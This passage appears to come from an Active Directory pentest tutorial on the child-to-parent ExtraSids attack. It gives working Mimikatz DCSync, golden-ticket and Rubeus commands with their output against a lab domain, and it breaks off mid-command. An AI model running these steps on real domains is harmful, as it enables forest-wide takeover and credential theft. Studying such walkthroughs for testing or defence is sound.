+<p>First, we need to obtain the NT hash for the <a href="https://adsecurity.org/?p=483">KRBTGT</a> account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments.</p>
+<p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p>
+<h3 id="obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz">Obtaining the KRBTGT Account's NT Hash using Mimikatz</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">PS</span><span class="p">:\&gt;</span>  <span class="n">mimikatz</span> <span class="c"># lsadump::dcsync /user:INTERNAL\krbtgt</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="no">[DC]</span> <span class="s1">&#39;INTERNAL.TRUSTED.LOCAL&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="no">[DC]</span> <span class="s1">&#39;CDC01.INTERNAL.TRUSTED.LOCAL&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="no">[DC]</span> <span class="s1">&#39;INTERNAL\krbtgt&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="no">[rpc]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="no">[rpc]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="n">9</span><span class="p">)</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">krbtgt</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="p">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="p">**</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">krbtgt</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="n">Account</span> <span class="nb">Type </span>        <span class="p">:</span> <span class="n">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="n">00000202</span> <span class="p">(</span> <span class="n">ACCOUNTDISABLE</span> <span class="n">NORMAL_ACCOUNT</span> <span class="p">)</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">2021</span> <span class="n">11</span><span class="p">:</span><span class="n">21</span><span class="p">:</span><span class="n">33</span> <span class="n">AM</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2806153819</span><span class="p">-</span><span class="n">209893948</span><span class="p">-</span><span class="n">922872689</span><span class="p">-</span><span class="n">502</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">502</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="n">Credentials</span><span class="p">:</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">9d765b482771505cbe97411065964d5f</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>    <span class="n">ntlm</span><span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">9d765b482771505cbe97411065964d5f</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>    <span class="n">lm</span>  <span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">69df324191d4a80f0ed100c10f20561e</span>
+</span></code></pre></div>
+<p>We can use the PowerView <code>Get-DomainSID</code> function to get the SID for the child domain, but this is also visible in the Mimikatz output above.</p>
+<h3 id="using-get-domainsid">Using Get-DomainSID</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="nb">Get-DomainSID</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2806153819</span><span class="p">-</span><span class="n">209893948</span><span class="p">-</span><span class="n">922872689</span>
+</span></code></pre></div>
+<p>Next, we can use <code>Get-DomainGroup</code> from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps">Get-ADGroup</a> cmdlet with a command such as <code>Get-ADGroup -Identity "Enterprise Admins" -Server "TRUSTED.LOCAL"</code>.</p>
+<h3 id="obtaining-enterprise-admins-groups-sid-using-get-domaingroup">Obtaining Enterprise Admins Group's SID using Get-DomainGroup</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="nb">Get-DomainGroup</span> <span class="n">-Domain</span> <span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Identity</span> <span class="s2">&quot;Enterprise Admins&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">distinguishedname</span><span class="p">,</span><span class="n">objectsid</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">distinguishedname</span>                                       <span class="n">objectsid</span>                                    
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="p">-----------------</span>                                       <span class="p">---------</span>                                    
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">CN</span><span class="p">=</span><span class="n">Enterprise</span> <span class="n">Admins</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">TRUSTED</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">LOCAL</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">519</span>
+</span></code></pre></div>
+<p>At this point, we have gathered the following data points:</p>
+<ul>
+<li>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code></li>
+<li>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code></li>
+<li>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: <code>hacker</code></li>
+<li>The FQDN of the child domain: <code>INTERNAL.TRUSTED.LOCAL</code></li>
+<li>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li>
+</ul>
+<p>Before the attack, we can confirm no access to the file system of the DC in the parent domain.</p>
+<h3 id="using-ls-to-confirm-no-access">Using ls to Confirm No Access</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="nb">ls </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">trusted</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">ls </span><span class="p">:</span> <span class="n">Access</span> <span class="n">is</span> <span class="n">denied</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">At</span> <span class="n">line</span><span class="p">:</span><span class="n">1</span> <span class="n">char</span><span class="p">:</span><span class="n">1</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">+</span> <span class="nb">ls </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">trusted</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="p">+</span> <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="p">+</span> <span class="n">CategoryInfo</span>          <span class="p">:</span> <span class="n">PermissionDenied</span><span class="p">:</span> <span class="p">(\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">trusted</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$:</span><span class="n">String</span><span class="p">)</span> <span class="p">[</span><span class="nb">Get-ChildItem</span><span class="p">],</span> <span class="n">UnauthorizedAccessException</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="p">+</span> <span class="n">FullyQualifiedErrorId</span> <span class="p">:</span> <span class="n">ItemExistsUnauthorizedAccessError</span><span class="p">,</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Commands</span><span class="p">.</span><span class="n">GetChildItemCommand</span>
+</span></code></pre></div>
+<p>Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.</p>
+<h3 id="creating-a-golden-ticket-with-mimikatz">Creating a Golden Ticket with Mimikatz</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">mimikatz</span> <span class="c"># kerberos::golden /user:hacker /domain:INTERNAL.TRUSTED.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">User</span>      <span class="p">:</span> <span class="n">hacker</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">Domain</span>    <span class="p">:</span> <span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">(</span><span class="n">INTERNAL</span><span class="p">)</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">SID</span>       <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2806153819</span><span class="p">-</span><span class="n">209893948</span><span class="p">-</span><span class="n">922872689</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">User</span> <span class="n">Id</span>   <span class="p">:</span> <span class="n">500</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">Groups</span> <span class="n">Id</span> <span class="p">:</span> <span class="p">*</span><span class="n">513</span> <span class="n">512</span> <span class="n">520</span> <span class="n">518</span> <span class="n">519</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">Extra</span> <span class="n">SIDs</span><span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">519</span> <span class="p">;</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="n">ServiceKey</span><span class="p">:</span> <span class="n">9d765b482771505cbe97411065964d5f</span> <span class="p">-</span> <span class="n">rc4_hmac_nt</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="n">Lifetime</span>  <span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">28</span><span class="p">/</span><span class="n">2022</span> <span class="n">7</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">50</span> <span class="n">PM</span> <span class="p">;</span> <span class="n">3</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2032</span> <span class="n">7</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">50</span> <span class="n">PM</span> <span class="p">;</span> <span class="n">3</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2032</span> <span class="n">7</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">50</span> <span class="n">PM</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="p">-&gt;</span> <span class="n">Ticket</span> <span class="p">:</span> <span class="p">**</span> <span class="n">Pass</span> <span class="n">The</span> <span class="n">Ticket</span> <span class="p">**</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a> <span class="p">*</span> <span class="n">PAC</span> <span class="n">generated</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a> <span class="p">*</span> <span class="n">PAC</span> <span class="n">signed</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a> <span class="p">*</span> <span class="n">EncTicketPart</span> <span class="n">generated</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a> <span class="p">*</span> <span class="n">EncTicketPart</span> <span class="n">encrypted</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a> <span class="p">*</span> <span class="n">KrbCred</span> <span class="n">generated</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="n">Golden</span> <span class="n">ticket</span> <span class="k">for</span> <span class="s1">&#39;hacker @ INTERNAL.TRUSTED.LOCAL&#39;</span> <span class="n">successfully</span> <span class="n">submitted</span> <span class="k">for</span> <span class="n">current</span> <span class="n">session</span>
+</span></code></pre></div>
+<p>We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.</p>
+<h3 id="confirming-a-kerberos-ticket-is-in-memory-using-klist">Confirming a Kerberos Ticket is in Memory Using klist</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="n">klist</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">Current</span> <span class="n">LogonId</span> <span class="n">is</span> <span class="n">0</span><span class="p">:</span><span class="n">0xf6462</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">Cached</span> <span class="n">Tickets</span><span class="p">:</span> <span class="p">(</span><span class="n">1</span><span class="p">)</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c">#0&gt;     Client: hacker @ INTERNAL.TRUSTED.LOCAL</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>        <span class="n">Server</span><span class="p">:</span> <span class="n">krbtgt</span><span class="p">/</span><span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">@</span> <span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>        <span class="n">KerbTicket</span> <span class="n">Encryption</span> <span class="n">Type</span><span class="p">:</span> <span class="n">RSADSI</span> <span class="n">RC4-HMAC</span><span class="p">(</span><span class="n">NT</span><span class="p">)</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>        <span class="n">Ticket</span> <span class="n">Flags</span> <span class="n">0x40e00000</span> <span class="p">-&gt;</span> <span class="n">forwardable</span> <span class="n">renewable</span> <span class="n">initial</span> <span class="n">pre_authent</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>        <span class="nb">Start </span><span class="n">Time</span><span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">28</span><span class="p">/</span><span class="n">2022</span> <span class="n">19</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">50</span> <span class="p">(</span><span class="n">local</span><span class="p">)</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span class="k">End</span> <span class="n">Time</span><span class="p">:</span>   <span class="n">3</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2032</span> <span class="n">19</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">50</span> <span class="p">(</span><span class="n">local</span><span class="p">)</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>        <span class="n">Renew</span> <span class="n">Time</span><span class="p">:</span> <span class="n">3</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2032</span> <span class="n">19</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">50</span> <span class="p">(</span><span class="n">local</span><span class="p">)</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>        <span class="n">Session</span> <span class="n">Key</span> <span class="n">Type</span><span class="p">:</span> <span class="n">RSADSI</span> <span class="n">RC4-HMAC</span><span class="p">(</span><span class="n">NT</span><span class="p">)</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>        <span class="n">Cache</span> <span class="n">Flags</span><span class="p">:</span> <span class="n">0x1</span> <span class="p">-&gt;</span> <span class="n">PRIMARY</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>        <span class="n">Kdc</span> <span class="n">Called</span><span class="p">:</span>
+</span></code></pre></div>
+<p>From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.</p>
+<h3 id="listing-the-entire-c-drive-of-the-domain-controller">Listing the Entire C: Drive of the Domain Controller</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="nb">ls </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">trusted</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">trusted</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">B8B3</span><span class="p">-</span><span class="n">0D72</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a> <span class="n">Directory</span> <span class="n">of</span> <span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">trusted</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">09</span><span class="p">/</span><span class="n">15</span><span class="p">/</span><span class="n">2018</span>  <span class="n">12</span><span class="p">:</span><span class="n">19</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">PerfLogs</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">10</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2021</span>  <span class="n">01</span><span class="p">:</span><span class="n">50</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Program</span> <span class="n">Files</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="n">09</span><span class="p">/</span><span class="n">15</span><span class="p">/</span><span class="n">2018</span>  <span class="n">02</span><span class="p">:</span><span class="n">06</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="n">11</span><span class="p">/</span><span class="n">19</span><span class="p">/</span><span class="n">2021</span>  <span class="n">12</span><span class="p">:</span><span class="n">17</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Shares</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="n">10</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2021</span>  <span class="n">10</span><span class="p">:</span><span class="n">31</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Users</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="n">03</span><span class="p">/</span><span class="n">21</span><span class="p">/</span><span class="n">2022</span>  <span class="n">12</span><span class="p">:</span><span class="n">18</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Windows</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>               <span class="n">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="n">0</span> <span class="n">bytes</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>               <span class="n">6</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="n">18</span><span class="p">,</span><span class="n">080</span><span class="p">,</span><span class="n">178</span><span class="p">,</span><span class="n">176</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></code></pre></div>
+<h2 id="extrasids-attack-rubeus">ExtraSids Attack - Rubeus</h2>
+<p>We can also perform this attack using Rubeus.</p>
+<p>We will formulate our Rubeus command using the data we retrieved above. The <code>/rc4</code> flag is the NT hash for the KRBTGT account. The <code>/sids</code> flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.</p>
+<h3 id="creating-a-golden-ticket-using-rubeus">Creating a Golden Ticket using Rubeus</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">golden</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">9d765b482771505cbe97411065964d5f</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">INTERNAL</span><span class="p">.</span><span class="n">TRUSTED</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2806153819</span><span class="p">-</span><span class="n">209893948</span><span class="p">-</span><span class="n">922872689</span>  <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">519</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">hacker</span> <span 